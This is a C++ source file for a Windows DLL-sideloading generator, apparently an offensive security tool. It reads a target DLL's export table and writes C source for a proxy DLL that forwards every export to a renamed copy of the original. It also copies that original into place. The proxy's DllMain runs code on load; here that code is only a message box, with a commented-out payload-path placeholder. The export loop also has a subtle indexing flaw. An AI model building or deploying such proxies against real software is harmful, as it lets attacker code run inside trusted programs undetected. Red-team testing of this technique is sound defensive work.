#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <cstring>
#include <vector>
#include <windows.h>

namespace fs = std::filesystem;

std::string dllTemplate = R"(
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

PRAGMA_COMMENTS

DWORD WINAPI DoMagic(LPVOID lpParameter) {
    MessageBoxA(NULL, "You've been side loaded!", "Alert", MB_OK | MB_ICONWARNING);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
            CloseHandle(threadHandle);
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

)";

struct DllNet {
    std::vector<std::string> exportedFunc;
    std::vector<DWORD> Ordinal;
    DllNet(const std::string& path) {
        PDWORD functionAddress = {};
        HMODULE libraryBase = LoadLibraryA(path.c_str());

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
        PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

        DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

        PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
        PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
        PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

        for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {
            DWORD functionNameRVA = addressOfNamesRVA[i];
            DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
            char* functionName = (char*)functionNameVA;

            exportedFunc.push_back(functionName);
            Ordinal.push_back(addressOfNameOrdinalsRVA[i]);
        }
    }
};

std::string GetTempFileNameWithoutExtension() {
    char tempFileName[L_tmpnam];
    std::tmpnam(tempFileName);

    std::filesystem::path tempPath(tempFileName);
    return tempPath.stem().string();
}

int main(int argc, char* argv[]) {
    // Cheesy way to generate a temp filename for our original DLL
    std::string tempName = GetTempFileNameWithoutExtension();

    std::string orgDllPath;
    std::string pragmaBuilder;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--dll") == 0 || strcmp(argv[i], "-dll") == 0) {
            if (i + 1 < argc) orgDllPath = fs::absolute(argv[i + 1]).string();
        }
    }

    if (orgDllPath.empty() || !fs::exists(orgDllPath)) {
        std::cout << "[!] Cannot locate DLL path, does it exists?" << std::endl;
        return 0;
    }

    // Create an output directory to export stuff too
    std::string outPath = (fs::path("output_" + fs::path(orgDllPath).stem().string())).string();
    fs::create_directory(outPath);

    std::cout << "[+] Reading exports from " << orgDllPath << "..." << std::endl;

    // Read PeHeaders -> Exported Functions from provided DLL
    DllNet DllHeaders(orgDllPath.c_str());

    // Build up our linker redirects
    for (int i = 0; i < DllHeaders.Ordinal.size(); ++i) {
        pragmaBuilder += "#pragma comment(linker, \"/export:" + DllHeaders.exportedFunc[i] + "=" + tempName + "." + DllHeaders.exportedFunc[i] + ",@" + std::to_string(DllHeaders.Ordinal[i]) + "\")\n";
    }
    std::cout << "[+] Redirected " << DllHeaders.exportedFunc.size() << " function calls from " << fs::path(orgDllPath).filename().string() << " to " << tempName << ".dll" << std::endl;

    // Replace data in our template
    dllTemplate.replace(dllTemplate.find("PRAGMA_COMMENTS"), std::string("PRAGMA_COMMENTS").length(), pragmaBuilder);
    //dllTemplate.replace(dllTemplate.find("PAYLOAD_PATH"), std::string("PAYLOAD_PATH").length(), payloadPath);

    std::cout << "[+] Exporting DLL C source to " << outPath + "/" + fs::path(orgDllPath).stem().string() + "_pragma.c" << std::endl;

    std::ofstream outFile(outPath + "/" + fs::path(orgDllPath).stem().string() + "_pragma.c");
    outFile << dllTemplate;
    outFile.close();

    std::ifstream src(orgDllPath, std::ios::binary);
    std::ofstream dst(outPath + "/" + tempName + ".dll", std::ios::binary);
    dst << src.rdbuf();
    
    return 0;
}

